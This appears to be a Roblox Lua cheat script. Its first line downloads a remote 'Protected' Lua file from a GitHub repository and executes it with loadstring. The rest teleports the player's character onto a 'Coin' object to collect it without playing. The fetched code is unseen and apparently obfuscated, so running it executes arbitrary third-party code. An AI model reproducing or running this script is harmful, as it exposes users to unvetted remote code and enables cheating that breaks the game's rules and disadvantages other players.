loadstring(game:HttpGet("https://raw.githubusercontent.com/Wh1t3Bl4ckPT/Scripts/main/Protected_6640836446039649.lua"))()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local destinationFolder = game:GetService("Workspace"):FindFirstChild("Folder")
if destinationFolder then
    local destinationCoin = destinationFolder:FindFirstChild("Coin")
    
    if destinationCoin then
        character:SetPrimaryPartCFrame(destinationCoin.CFrame)
    else
        error("Coin was not founded.")
    end
else
    error("Folder was not founded.")
end